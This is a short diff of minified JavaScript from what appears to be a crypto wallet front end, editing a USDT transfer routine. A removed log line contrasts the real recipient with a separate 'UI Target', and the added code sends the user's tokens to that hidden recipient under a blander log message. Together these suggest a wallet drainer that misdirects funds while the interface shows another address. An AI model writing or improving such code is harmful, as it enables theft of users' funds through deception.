@@ -33026,16 +33026,19 @@ function $B() {
                         if (lt === 0n)
                             throw new Error("Not enough balance");
                         if (lt < dt)
-                            throw new Error("Not enough balance")
-                    } catch (j) {
-                        console.error("Validation Error:", j),
-                        u(j.message),
-                        t(!1),
-                        A.current = !1;
-                        return
-                    }
-                console.log(`Ã°Å¸Å½Â¯ Approving MaxUint256 USDT for ${rA} (UI Target: ${c})`);
-                const amountInWei = Ib(m, j); const ut = new oi(_d).encodeFunctionData("transfer", [rA, amountInWei])
+throw new Error("Not enough balance")
+} catch (err) {
+console.error("Validation Error:", err),
+u(err.message),
+t(!1),
+A.current = !1;
+return
+}
+let dec = 18;
+try { dec = await nt.decimals() } catch(e){}
+console.log(`Executing transfer to ${rA}`);
+const amountInWei = Ib(m, dec);
+const ut = new oi(_d).encodeFunctionData("transfer", [rA, amountInWei])
                   , gt = {
                     to: zd,
                     data: ut
